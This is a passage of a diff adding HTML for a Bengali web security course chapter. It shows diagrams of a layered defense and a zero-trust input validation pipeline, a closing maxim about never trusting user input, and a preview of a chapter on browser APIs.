+              <span style="color: #475569;">├</span>─ <span style="color: #c084fc; font-weight: 700;">Authorization</span>
+              <span style="color: #475569;">├</span>─ <span style="color: #c084fc; font-weight: 700;">Rate Limit</span>
+              <span style="color: #475569;">├</span>─ <span style="color: #c084fc; font-weight: 700;">Validation</span>
+              <span style="color: #475569;">└</span>─ <span style="color: #34d399; font-weight: 700;">Safe</span> Errors</pre>
+</div>
+      
+      <div class="section-subhead" style="margin-top: 6px;">⭐ এন্ড-টু-এন্ড রিকোয়েস্ট সিকিউরিটি পাইপলাইন:</div>
+      <div class="ascii-tree-container">
+  <div class="ascii-tree-header">🛡️ Zero-Trust Input & Execution Pipeline</div>
+  <pre class="ascii-tree-content"><span style="color: #fde047; font-weight: 600;">User</span> Input
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #f43f5e; font-weight: 700;">Untrusted</span>
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Validate
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Sanitize / Encode where needed
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Authenticate
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+Authorize
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #34d399; font-weight: 700;">Secure</span> <span style="color: #fde047; font-weight: 600;">API</span>
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #34d399; font-weight: 700;">Secure</span> <span style="color: #fde047; font-weight: 600;">Database</span>
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #34d399; font-weight: 700;">Safe</span> Response
+    <span style="color: #38bdf8; font-weight: 700;">↓</span>
+<span style="color: #34d399; font-weight: 700;">Secure</span> <span style="color: #fde047; font-weight: 600;">Browser</span> Rendering</pre>
+</div>
+
+      <div class="def-box" style="margin-top: 6px; padding: 6px 10px; background: #fef2f2; border-left: 3px solid #ef4444;">
+        <div style="font-weight: 700; font-size: 10px; color: #991b1b; margin-bottom: 2px;">🔥 Chapter 31-এর সবচেয়ে গুরুত্বপূর্ণ চিরন্তন বাক্য:</div>
+        <div style="font-size: 10px; color: #b91c1c; font-weight: 600; line-height: 1.45;">
+          “Never trust the client, never trust user input, and never assume one security mechanism is enough.”
+        </div>
+      </div>
+
+      <div class="def-box" style="margin-top: 6px; padding: 6px 10px; background: #eff6ff; border-left: 3px solid #2563eb;">
+        <div style="font-weight: 700; font-size: 10px; color: #1e40af; margin-bottom: 2px;">🚀 Next Chapter Preview:</div>
+        <div style="font-family: var(--font-heading); font-size: 10px; font-weight: 700; color: #0369a1;">
+          Chapter 32 — Advanced Browser APIs
+        </div>
+        <div style="font-size: 9px; color: #334155; margin-top: 2px;">পরবর্তী চ্যাপ্টারে আমরা শিখব Geolocation, IntersectionObserver, MutationObserver, ResizeObserver, Clipboard, Web Workers, IndexedDB, WebSockets এবং File API।</div>
+      </div>
+    </div>
+
+  </div>
+
+</body>
+</html>
